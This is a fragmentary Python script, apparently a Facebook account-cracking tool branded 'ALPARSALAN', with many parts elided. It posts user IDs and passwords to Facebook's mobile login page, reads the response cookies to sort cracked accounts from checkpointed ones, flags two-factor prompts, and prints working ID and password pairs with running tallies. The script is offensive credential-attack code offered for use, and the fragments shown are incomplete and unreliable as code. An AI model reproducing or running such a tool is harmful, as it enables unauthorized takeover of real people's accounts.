            ...
            if 'c_user' in cookies:
                ...
                if cid in tf:
                    ...
                    if 'Enter login code to continue' in str(d.group(1)):
                        ...
                        print('\r\033[1;95m[ALPARSALAN-2F] '+cid+' | '+pas+'\033[0;97m')
                        tf.append(cid)
...
def Filex():
    ...
    print("[0] EXIT")
    linex() 
    check=input(f" CHOOSE {ALPARSALAN2} :")
    if check in ['01','1']:
        file_m()
    elif check in ['02','2']:
...
def freeq(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            lo = session.post('https://m.facebook.com/login.php',data=log_data,headers=header_freefb).text
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[ALPARSALAN] [%s] \33[1;97m[OK:%s{ALPARSALAN2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
